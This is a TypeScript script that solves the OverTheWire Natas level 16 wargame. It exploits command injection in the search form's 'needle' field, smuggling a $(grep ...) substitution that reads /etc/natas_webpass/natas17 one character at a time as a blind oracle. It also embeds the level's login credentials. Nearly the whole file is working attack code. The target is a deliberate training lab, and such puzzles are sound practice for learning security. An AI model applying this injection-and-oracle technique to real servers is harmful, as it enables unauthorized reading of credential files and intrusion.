const rp = require('request-promise');
import * as http from "http"
const keepAliveAgent = new http.Agent({
	keepAlive: true,
	maxSockets:  40 
});

const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
let password: any[] = [];
for(let j = 0; j < 32; j++){
	password.push("#");
}

for(let k = 0; k < 32; k++){
	let promiseArray: Promise<string>[] = [];
	for (let i = 0; i < chars.length; i++){
		let query = `barefoot$(grep -E ^[[:alnum:]]{${k}}${chars[i]} /etc/natas_webpass/natas17)`;
		console.log(query);
		let promise = rp.post('http://natas16.natas.labs.overthewire.org', {
			form : {
				needle : query,
				submit : 'Search'
			},
			pool: keepAliveAgent
		})
			.auth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh', true)
		promiseArray.push(promise);
		query = "";
	}
	Promise.all(promiseArray)
		.then((responses: string[]) => {
			for (let i = 0; i < responses.length; i += 1){
				console.log(responses[i]);
				if (responses[i].includes('barefoot') == false){
					password[k] = chars[i];
				}
			}
		})
		.catch(console.error);
}
process.on('exit', function() {
	console.log(password.join(''));
	keepAliveAgent.destroy();
	console.log("Goodbye!");
})

